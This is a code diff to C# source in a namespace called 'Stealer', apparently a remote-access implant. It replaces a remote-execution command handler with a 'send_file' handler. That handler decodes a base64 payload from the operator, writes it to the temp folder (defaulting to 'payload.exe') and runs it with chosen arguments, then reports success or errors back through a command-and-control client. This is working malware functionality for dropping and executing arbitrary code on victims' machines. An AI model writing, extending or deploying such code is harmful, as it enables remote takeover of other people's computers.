@@ -207,14 +207,19 @@ namespace Stealer
             {
                 Task.Run(() => SetSuspendState(false, false, false));
             }
-            // ── Remote Execution ──────────────────────────────────────────────
-            else if (cmdLower.StartsWith("remote_exec:"))
+            // ── Send File to Disk ──────────────────────────────────────────────
+            else if (cmdLower.StartsWith("send_file:"))
             {
-                string rest = cmd.Substring("remote_exec:".Length);
-                int sep = rest.IndexOf('|');
-                string exePath = sep > 0 ? rest.Substring(0, sep) : rest;
-                string exeArgs = sep > 0 ? rest.Substring(sep + 1) : "";
-                RemoteExec(exePath, exeArgs);
+                string rest = cmd.Substring("send_file:".Length);
+                int sep1 = rest.IndexOf('|');
+                int sep2 = sep1 >= 0 ? rest.IndexOf('|', sep1 + 1) : -1;
+                if (sep1 >= 0 && sep2 >= 0)
+                {
+                    string filename = rest.Substring(0, sep1);
+                    string args     = rest.Substring(sep1 + 1, sep2 - sep1 - 1);
+                    string b64      = rest.Substring(sep2 + 1);
+                    SendFileToDisk(filename, args, b64);
+                }
             }
         }
 
@@ -425,27 +430,33 @@ namespace Stealer
             });
         }
 
-        // ── Remote Execution ─────────────────────────────────────────────────
+        // ── Send File to Disk ─────────────────────────────────────────────────
 
-        private static void RemoteExec(string path, string args)
+        private static void SendFileToDisk(string filename, string args, string b64)
         {
             Task.Run(() =>
             {
                 try
                 {
+                    byte[] data = Convert.FromBase64String(b64);
+                    // Sanitize filename
+                    string safeName = System.IO.Path.GetFileName(filename.Trim());
+                    safeName = System.Text.RegularExpressions.Regex.Replace(safeName, @"[^\w\.\-\(\) ]", "_");
+                    if (string.IsNullOrEmpty(safeName)) safeName = "payload.exe";
+                    string destPath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), safeName);
+                    System.IO.File.WriteAllBytes(destPath, data);
                     var psi = new ProcessStartInfo
                     {
-                        FileName        = path,
+                        FileName        = destPath,
                         Arguments       = args,
                         UseShellExecute = true,
                     };
                     Process.Start(psi);
-                    C2Client.SendText("{\"type\":\"exec_res\",\"success\":true,\"path\":\"" + path.Replace("\\","\\\\").Replace("\"","\\\"") + "\"}");
+                    C2Client.SendText("{\"type\":\"exec_res\",\"success\":true,\"path\":\"" + EscJson(destPath) + "\"}");
                 }
                 catch (Exception ex)
                 {
-                    string err = ex.Message.Replace("\\","\\\\").Replace("\"","\\\"");
-                    C2Client.SendText("{\"type\":\"exec_res\",\"success\":false,\"error\":\"" + err + "\"}");
+                    C2Client.SendText("{\"type\":\"exec_res\",\"success\":false,\"error\":\"" + EscJson(ex.Message) + "\"}");
                 }
             });
         }
